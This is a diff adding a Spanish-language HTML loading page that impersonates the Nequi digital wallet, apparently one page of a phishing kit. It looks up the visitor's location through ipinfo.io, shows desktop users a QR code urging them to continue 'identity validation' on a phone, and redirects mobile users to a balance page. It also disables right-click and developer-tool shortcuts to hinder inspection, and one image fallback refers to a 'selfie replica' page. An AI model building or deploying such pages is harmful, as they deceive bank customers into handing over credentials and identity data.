@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon_n.png" type="favicon.png" sizes="16x16" />
+    <title>Cargando... - Nequi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background-color: #000; 
+        }
+
+        .background-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('cap_fondo.PNG');
+            background-size: cover;
+            background-position: center;
+            z-index: 1;
+        }
+
+        .dark-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+           
+            backdrop-filter: blur(8px); 
+            -webkit-backdrop-filter: blur(8px); 
+            z-index: 2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Ahora el contenedor es invisible y solo posiciona el gif */
+        .loader-container {
+            z-index: 3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loader-gif {
+            width: 180px; /* Puedes ajustar el tamaño aquí */
+            height: auto;
+        }
+
+        /* Pantalla de bloqueo para PC con Código QR (idéntica a las demás vistas) */
+        #desktop-blocker {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #ffffff;
+            z-index: 99999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .desktop-logo {
+            height: 60px;
+            object-fit: contain;
+            margin-bottom: 28px;
+        }
+
+        .qr-container {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            border: 1px solid #f0f0f5;
+            margin-bottom: 24px;
+        }
+
+        .qr-container img {
+            width: 220px;
+            height: 220px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .desktop-title {
+      font-family: 'Manrope', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-size: 26px;
+      font-weight: 800;
+      color: #1e002c;
+      margin-bottom: 10px;
+    }
+
+    .desktop-desc {
+      font-family: 'Manrope', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-size: 15px;
+      color: #625768;
+      max-width: 380px;
+      line-height: 1.4;
+      font-weight: 500;
+      margin: 0 auto;
+    }
+    </style>
+</head>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script>
+     $.getJSON("https://ipinfo.io", function (response) {
+        $("#address").html("" + response.city + ", " + response.country);
+    })
+</script>
+
+<body oncontextmenu="return false;">
+
+    <!-- Pantalla exclusiva para PC con Logo y Código QR -->
+    <div id="desktop-blocker">
+      <img class="desktop-logo" src="NequiArchivos/vOLtQz8.png" alt="Nequi" onerror="this.src='vOLtQz8.png';">
+      <div class="qr-container">
+        <img src="NequiArchivos/codigo_qr.png" alt="Escanea el código QR" onerror="this.src='https_blue-mud-094b42a10_4_azurestaticapps_net_nequi_nequi_selfie_replica_html.png';">
+      </div>
+      <div class="desktop-title">Escanea el código QR</div>
+      <p class="desktop-desc">Usa la cámara de tu celular para escanear el código y continuar con la validación de identidad.</p>
+    </div>
+
+    <div class="background-image"></div>
+
+    <div class="dark-overlay">
+        <div class="loader-container">
+            <img src="NequiArchivos/loader.gif" alt="Cargando..." class="loader-gif">
+        </div>
+    </div>
+
+    <p id="address" hidden=""></p>
+
+    <script>
+        // Función de detección directa para PC
+        function checkDevice() {
+            const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
+            if (isDesktop) {
+                const blocker = document.getElementById('desktop-blocker');
+                if (blocker) {
+                    blocker.style.display = 'flex';
+                }
+            }
+        }
+
+        // Ejecutar inmediatamente
+        checkDevice();
+        window.addEventListener('DOMContentLoaded', checkDevice);
+
+        // Redirige después de 5 segundos solo si está en móvil (si está en PC se queda en el QR)
+        setTimeout(function() {
+            const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
+            if (!isDesktop) {
+                window.location.href = 'saldo.html'; 
+            }
+        }, 5000); 
+    </script>
+
+    <script> // --- Bloqueo de inspección y teclado ---
+        document.onkeydown = function(e) {
+            // Bloquear F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (e.keyCode == 123 || 
+               (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || 
+               (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
+                return false;
+            }
+        };
+
+        // Bloquear clic derecho
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        }, false);
+    </script>
+
+</body>
+</html>
